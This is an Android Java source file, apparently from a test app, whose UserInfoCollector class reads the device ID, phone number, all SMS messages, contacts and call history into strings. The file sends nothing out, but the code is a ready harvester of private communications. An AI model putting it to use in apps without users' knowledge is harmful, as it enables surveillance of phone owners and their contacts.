package com.example.act_test;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;

import java.text.SimpleDateFormat;
import java.util.Date;

public class UserInfoCollector {
    private Context mContext;

    public UserInfoCollector(Context context) {
        mContext = context;
    }

    public String getTelephonyInfo(){
        String info = "";
        try {
            TelephonyManager tm = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
            //! deprecated in API level 26
            String deviceId = tm.getDeviceId();
            String phoneNumber = tm.getLine1Number();
            info += "deviceId:" + deviceId +"\n";
            info += "phoneNumber:" + phoneNumber +"\n";
        }catch (Exception e) {
            info += "失败: " + e.getMessage() + "\n";
        }
        return info;
    }

    public String getSMSInfo() {
        // 权限: READ_SMS
        String info = "";

        try {
            // get SMS messages
            Uri smsUri = Uri.parse("content://sms/");
            Cursor smsCursor = mContext.getContentResolver().query(smsUri, null, null, null, null);

            if (smsCursor != null && smsCursor.moveToFirst()) {
                do {
                    String address = smsCursor.getString(smsCursor.getColumnIndex("address"));
                    String body = smsCursor.getString(smsCursor.getColumnIndex("body"));
                    long date = smsCursor.getLong(smsCursor.getColumnIndex("date"));
                    int type = smsCursor.getInt(smsCursor.getColumnIndex("type"));

                    info += "短信地址：" + address + "\n";
                    info += "短信内容：" + body + "\n";
                    info += "短信时间：" + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(date)) + "\n";
                    info += "短信类型：" + (type == 1 ? "接收" : "发送") + "\n\n";
                } while (smsCursor.moveToNext());
                smsCursor.close();
            }
        }catch (Exception e) {
            info += "失败: " + e.getMessage() + "\n";
        }
        return info;
    }

    public String getContactsInfo() {
        // 权限: READ_CONTACTS
        String info = "";

        try{
            Uri contactsUri = ContactsContract.Contacts.CONTENT_URI;
            ContentResolver resolver = mContext.getContentResolver();
            Cursor contactsCursor = resolver.query(contactsUri, null, null, null, null);

            if (contactsCursor != null && contactsCursor.moveToFirst()) {
                do {
                    String name = contactsCursor.getString(contactsCursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    String id = contactsCursor.getString(contactsCursor.getColumnIndex(ContactsContract.Contacts._ID));

                    Cursor cursor = resolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{id},
                        null
                    );
                    String phoneNumber = "";
                    if (cursor != null && cursor.moveToFirst()) {
                        phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        cursor.close();
                    }

                    info += "ID: " + id + "\n";
                    info += "姓名: " + name + "\n";
                    info += "电话: " + phoneNumber + "\n\n";
                } while (contactsCursor.moveToNext());
                contactsCursor.close();
            }
        }catch (Exception e) {
            info += "失败: " + e.getMessage() + "\n";
        }
        return info;
    }
    public String getCallhistInfo(){
        // 权限: READ_CALL_LOG
        String info = "";

        try{
            // get call history
            Uri callLogUri = CallLog.Calls.CONTENT_URI;
            Cursor callLogCursor = mContext.getContentResolver().query(callLogUri, null, null, null, null);

            if (callLogCursor != null && callLogCursor.moveToFirst()) {
                do {
                    String number = callLogCursor.getString(callLogCursor.getColumnIndex(CallLog.Calls.NUMBER));
                    long date = callLogCursor.getLong(callLogCursor.getColumnIndex(CallLog.Calls.DATE));
                    int duration = callLogCursor.getInt(callLogCursor.getColumnIndex(CallLog.Calls.DURATION));
                    int type = callLogCursor.getInt(callLogCursor.getColumnIndex(CallLog.Calls.TYPE));

                    info += "通话号码：" + number + "\n";
                    info += "通话时间：" + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(date)) + "\n";
                    info += "通话时长：" + duration + "秒\n";
                    info += "通话类型：" + (type == CallLog.Calls.INCOMING_TYPE ? "呼入" :
                            (type == CallLog.Calls.OUTGOING_TYPE ? "呼出" : "未接")) + "\n\n";
                } while (callLogCursor.moveToNext());
                callLogCursor.close();
            }
        }catch (Exception e) {
            info += "失败: " + e.getMessage() + "\n";
        }

        return info;
    }


}
